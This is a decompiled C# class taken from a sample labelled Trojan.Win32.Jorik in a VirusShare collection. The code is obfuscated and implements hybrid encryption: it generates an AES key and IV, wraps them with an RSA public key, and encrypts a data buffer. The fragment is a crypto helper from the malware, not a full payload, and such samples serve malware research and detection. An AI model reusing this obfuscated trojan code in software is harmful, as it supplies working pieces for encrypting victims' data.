// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ccy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=cc6f4431894d1c97
// MVID: 2A74CDCD-1E5F-40DD-90C8-12E38E6596C8
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Jorik.Llac.cfi-7d3f633a775aae62503ba637b47672afca334a930966f3c35ac40563155370b2.exe

using \u0001;
using \u0004;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace \u0004
{
  internal class \u0003
  {
    [NonSerialized]
    internal static \u0001.\u0001 \u0001;
    public static string \u0001;

    static \u0003() => \u0002.\u0002(typeof (\u0003));

    public static byte[] \u0002([In] byte[] obj0, [In] string obj1)
    {
      if (obj1.StartsWith(\u0003.\u0001(700)))
      {
        \u0003.\u0001 = \u0003.\u0001(705);
        return (byte[]) null;
      }
      if (true)
        goto label_41;
label_3:
      if (true)
        goto label_42;
label_4:
      MemoryStream memoryStream;
      do
      {
        if (true)
          goto label_43;
label_5:
        continue;
label_43:
        memoryStream = (MemoryStream) null;
        goto label_5;
      }
      while (false);
      if (true)
        goto label_44;
label_7:
      RijndaelManaged rijndaelManaged1;
      RSACryptoServiceProvider cryptoServiceProvider1;
      CryptoStream cryptoStream;
      try
      {
        if (true)
        {
          if (true)
          {
            do
            {
              RijndaelManaged rijndaelManaged2 = new RijndaelManaged();
              if (true)
                rijndaelManaged1 = rijndaelManaged2;
              else
                break;
            }
            while (false);
            goto label_25;
          }
        }
        else
          goto label_25;
label_21:
        cryptoStream.FlushFinalBlock();
        return memoryStream.ToArray();
label_25:
        do
        {
          RSACryptoServiceProvider cryptoServiceProvider2 = new RSACryptoServiceProvider();
          if (true)
            cryptoServiceProvider1 = cryptoServiceProvider2;
          cryptoServiceProvider1.FromXmlString(obj1);
          rijndaelManaged1.GenerateKey();
          rijndaelManaged1.GenerateIV();
          do
          {
            byte[] numArray1 = new byte[48];
            Buffer.BlockCopy((Array) rijndaelManaged1.Key, 0, (Array) numArray1, 0, 32);
            Buffer.BlockCopy((Array) rijndaelManaged1.IV, 0, (Array) numArray1, 32, 16);
            memoryStream = new MemoryStream();
            try
            {
              if (false)
                goto label_12;
label_11:
              byte[] buffer = cryptoServiceProvider1.Encrypt(numArray1, false);
              memoryStream.WriteByte((byte) 1);
label_12:
              memoryStream.WriteByte(Convert.ToByte(buffer.Length / 8));
              memoryStream.Write(buffer, 0, buffer.Length);
              if (false)
                goto label_11;
            }
            catch (CryptographicException ex1)
            {
              try
              {
                byte[] numArray2 = new byte[16];
                byte[] numArray3 = new byte[16];
                Buffer.BlockCopy((Array) rijndaelManaged1.Key, 0, (Array) numArray2, 0, 16);
                Buffer.BlockCopy((Array) rijndaelManaged1.Key, 16, (Array) numArray3, 0, 16);
                byte[] buffer1 = cryptoServiceProvider1.Encrypt(numArray2, false);
                byte[] buffer2 = cryptoServiceProvider1.Encrypt(numArray3, false);
                byte[] buffer3 = cryptoServiceProvider1.Encrypt(rijndaelManaged1.IV, false);
                memoryStream.WriteByte((byte) 2);
                memoryStream.WriteByte(Convert.ToByte(buffer1.Length / 8));
                memoryStream.Write(buffer1, 0, buffer1.Length);
                memoryStream.Write(buffer2, 0, buffer2.Length);
                memoryStream.Write(buffer3, 0, buffer3.Length);
              }
              catch (CryptographicException ex2)
              {
                do
                {
                  \u0003.\u0001 = \u0003.\u0001(798);
                }
                while (false);
                return (byte[]) null;
              }
            }
          }
          while (false);
        }
        while (false);
        cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged1.CreateEncryptor(), CryptoStreamMode.Write);
        cryptoStream.Write(obj0, 0, obj0.Length);
        goto label_21;
      }
      catch (Exception ex)
      {
        if (true)
          \u0003.\u0001 = \u0003.\u0001(1004) + ex.Message;
        return (byte[]) null;
      }
      finally
      {
        rijndaelManaged1?.Clear();
        cryptoServiceProvider1?.Clear();
        if (true)
        {
          memoryStream?.Close();
          if (cryptoStream == null)
            goto label_40;
        }
        if (true)
          cryptoStream.Close();
label_40:;
      }
label_44:
      cryptoStream = (CryptoStream) null;
      goto label_7;
label_42:
      cryptoServiceProvider1 = (RSACryptoServiceProvider) null;
      goto label_4;
label_41:
      rijndaelManaged1 = (RijndaelManaged) null;
      goto label_3;
    }
  }
}
